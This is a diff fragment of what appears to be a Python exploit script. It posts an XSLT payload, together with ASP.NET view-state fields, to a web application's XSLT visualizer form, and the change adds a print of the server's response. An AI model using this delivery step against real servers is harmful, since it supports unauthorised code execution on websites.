@@ -59,4 +59,5 @@ class Payload:
         data = {"__EVENTTARGET":"","__EVENTARGUMENT":"","__VIEWSTATE":VIEWSTATE,"__VIEWSTATEGENERATOR":VIEWSTATEGENERATOR,"ctl00$body$xsltSelection":payload,"ctl00$body$contentPicker$ContentIdValue":"","ctl00$body$visualizeDo":"Visualize+XSLT"};
         
         r4 = s.post(url_xslt,data=data,headers=headers);
+        print(r4)
         print("Success")
